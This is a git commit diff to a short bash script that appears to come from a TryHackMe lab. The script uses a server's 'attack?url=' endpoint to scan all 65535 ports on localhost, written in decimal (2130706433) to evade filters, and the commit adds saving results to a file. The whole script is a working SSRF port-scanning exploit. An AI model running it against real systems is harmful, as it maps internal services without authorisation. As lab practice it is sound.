b9b27f0a3683c1fa82ba4e273f05d1956f90e027
root <root@ip-10-10-68-219.eu-west-1.compute.internal>
2021-08-02 02:09:20 +0100

    adds file saving

--- potential-tribble/thm-script.sh
+++ potential-tribble/thm-script.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
 
+rm yo_ports.txt
+
 for x in {1..65535};
     do cmd=$(curl -so /dev/null http://10.10.191.25:8000/attack?url=http://2130706433:${x} \
         -w '%{size_download}');
+
     if [ $cmd != 1045 ]; then
-        echo "Open port: $x"
+        echo "Open port: $x" | tee -a yo_ports.txt
     fi
 done
